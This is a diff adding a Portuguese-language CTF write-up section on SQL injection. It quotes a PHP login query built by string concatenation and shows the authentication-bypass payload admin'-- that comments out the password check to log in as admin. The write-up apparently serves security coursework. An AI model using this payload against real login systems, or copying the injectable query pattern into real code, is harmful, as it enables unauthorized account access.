@@ -117,4 +117,34 @@ Assim, ao utilizarmos a nova senha para Boby, conseguimos entrar na conta dele:
 
 ![image](assets/s8i11.png)
 
-## CTF - Format Strings
+## CTF - SQL Injection
+
+O objetivo deste CTF era obter acesso à flag devido à vulnerabilidade existente na validação do login.
+
+Ao analisar o ficheiro ```index.php``` foi possível verificar que a query executada para cada tentativa de login é a seguinte query.
+```sql
+    $username = $_POST['username'];
+    $password = $_POST['password']; 
+    $query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
+```
+
+Como a validação é feita diretamente com os valores inseridos pelo utilizador, é possível explorar a vulnerabilidade de SQL Injection. Para tal, basta inserir o seguinte no campo de username e password.
+```sql
+    admin'--
+    password
+```
+
+Ao introduzir ```admin'--``` como username, a query executada será a seguinte,
+
+```sql
+    SELECT username FROM user WHERE username = 'admin'--' AND password = 'password'
+```
+
+comentado o resto da query possibilitando fazer login com o utilizador admin, sem necessitar de saber a password.
+
+![Login](assets/s8i12.png)
+
+
+Obtendo assim a flag. 
+
+![Flag](assets/s8i13.png)
